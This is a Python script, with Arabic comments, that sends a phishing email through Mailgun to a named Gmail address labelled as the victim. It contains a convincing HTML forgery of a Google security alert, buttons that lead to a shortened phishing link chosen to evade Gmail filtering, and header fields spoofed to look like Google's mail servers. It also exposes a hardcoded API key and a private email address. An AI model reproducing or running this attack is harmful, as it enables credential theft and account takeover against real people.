import requests
import time
import base64

# ===== إعدادات Mailgun =====
MAILGUN_API_KEY = '9c29cf0bd5f3acf85f337db6e9b9ac44-80ae0276-10a1e163'
MAILGUN_DOMAIN = 'sandbox1fd165c1ba7349b9b02a9d55dd0304e4.mailgun.org'
MAILGUN_BASE_URL = 'https://api.mailgun.net/v3'

SENDER_NAME = 'Google Account Team'
SENDER_EMAIL = f'security@{MAILGUN_DOMAIN}'
TARGET = 'gaithgoran711@gmail.com'  # الضحية

# استخدم رابط مختصر (bit.ly) عشان Gmail ما يحظره
PHISH_LINK = 'http://bit.ly/4nJUelE'  # ← غير إلى رابط bit.ly

# ==========================

html = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"></head>
<body style="margin:0;padding:0;background:#e8eaed;font-family:Roboto,Helvetica,Arial,sans-serif">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#e8eaed;padding:20px 0">
<tr><td align="center">
<table width="600" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:24px;box-shadow:0 1px 3px rgba(0,0,0,.12);overflow:hidden">

<!-- Header -->
<tr><td style="padding:32px 32px 0 32px;text-align:center">
<img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_dark.svg" width="74" height="24" style="margin-bottom:20px" alt="Google">
<p style="color:#5f6368;font-size:12px;font-weight:500;letter-spacing:1.5px;margin:0 0 24px 0;text-transform:uppercase">Security Alert</p>
</td></tr>

<!-- Icon -->
<tr><td style="padding:0 32px;text-align:center">
<div style="width:56px;height:56px;border-radius:50%;background:#e8f0fe;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">
<svg width="32" height="32" viewBox="0 0 24 24"><path fill="#1a73e8" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
</div>
<h1 style="font-size:22px;color:#202124;font-weight:400;margin:0 0 8px 0;letter-spacing:-.3px">Suspicious sign in prevented</h1>
<p style="font-size:14px;color:#5f6368;line-height:1.5;margin:0 0 24px 0">Someone just tried to sign in to your Google Account <b style="color:#202124">{TARGET}</b>. We blocked this attempt.</p>
</td></tr>

<!-- Details Table -->
<tr><td style="padding:0 32px">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f8f9fa;border-radius:16px;margin-bottom:24px;border:1px solid #e8eaed">
<tr><td style="padding:16px 20px">
<table width="100%">
<tr><td style="font-size:13px;color:#5f6368;padding:5px 0;width:95px">Date</td><td style="font-size:13px;color:#202124;font-weight:500;padding:5px 0">May 21, 2026</td></tr>
<tr><td style="font-size:13px;color:#5f6368;padding:5px 0">Time</td><td style="font-size:13px;color:#202124;font-weight:500;padding:5px 0">9:14 AM Arabia Standard Time</td></tr>
<tr><td style="font-size:13px;color:#5f6368;padding:5px 0">Device</td><td style="font-size:13px;color:#202124;font-weight:500;padding:5px 0">iPhone 16 Pro Max • iOS 18.7</td></tr>
<tr><td style="font-size:13px;color:#5f6368;padding:5px 0">Location</td><td style="font-size:13px;color:#202124;font-weight:500;padding:5px 0">Baghdad, Iraq (Estimated)</td></tr>
<tr><td style="font-size:13px;color:#5f6368;padding:5px 0">IP address</td><td style="font-size:13px;color:#202124;font-weight:500;padding:5px 0">185.84.70.177</td></tr>
<tr><td style="font-size:13px;color:#5f6368;padding:5px 0">Browser</td><td style="font-size:13px;color:#202124;font-weight:500;padding:5px 0">Safari</td></tr>
</table>
</td></tr>
</table>
</td></tr>

<!-- Button -->
<tr><td style="padding:0 32px 24px 32px;text-align:center">
<a href="{PHISH_LINK}" target="_blank" style="display:inline-block;background:#1a73e8;color:#fff;text-decoration:none;padding:14px 32px;border-radius:50px;font-size:14px;font-weight:500;font-family:Roboto,Arial,sans-serif;letter-spacing:.25px;box-shadow:0 1px 3px rgba(0,0,0,.12)">Review security activity</a>
<p style="font-size:13px;color:#5f6368;margin:20px 0 0 0;line-height:1.5">If this wasn't you, <a href="{PHISH_LINK}" style="color:#1a73e8;text-decoration:none;font-weight:500">secure your account</a> now.</p>
</td></tr>

<!-- Footer -->
<tr><td style="padding:20px 32px;border-top:1px solid #e8eaed;text-align:center">
<p style="font-size:11px;color:#5f6368;line-height:1.5;margin:0">This email can't receive replies. For more information, visit the <a href="#" style="color:#1a73e8;text-decoration:none">Google Account Help Center</a>.</p>
<p style="font-size:11px;color:#5f6368;line-height:1.5;margin:8px 0 0 0">Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043 USA</p>
</td></tr>

</table>
</td></tr>
</table>
</body>
</html>'''

# ===== إرسال عبر Mailgun API =====
url = f'{MAILGUN_BASE_URL}/{MAILGUN_DOMAIN}/messages'

data = {
    'from': f'{SENDER_NAME} <{SENDER_EMAIL}>',
    'to': [TARGET],
    'subject': 'Security alert for your linked Google Account',
    'html': html,
    'o:tracking': 'no',
    'o:tracking-clicks': 'no',
    'o:tracking-opens': 'no',
    'h:Message-ID': f'<{int(time.time()*1000000)}.google.security.{hash(TARGET)}@mail.{MAILGUN_DOMAIN}>',
    'h:X-Mailer': 'Google Mail Server v2.14',
    'h:X-Priority': '1 (Highest)',
    'h:Return-Path': 'no-reply@google.com',
    'h:List-Unsubscribe': '<mailto:unsubscribe@google.com>'
}

try:
    r = requests.post(
        url,
        auth=('api', MAILGUN_API_KEY),
        data=data,
        timeout=30
    )
    
    if r.status_code == 200:
        print(f'[+] EMAIL SENT SUCCESSFULLY!')
        print(f'    To: {TARGET}')
        print(f'    From: {SENDER_NAME} <{SENDER_EMAIL}>')
        print(f'    Link: {PHISH_LINK}')
        print(f'    Response: {r.json()}')
    else:
        print(f'[-] FAILED: {r.status_code}')
        print(f'    Response: {r.text}')
        
except Exception as e:
    print(f'[-] ERROR: {e}')
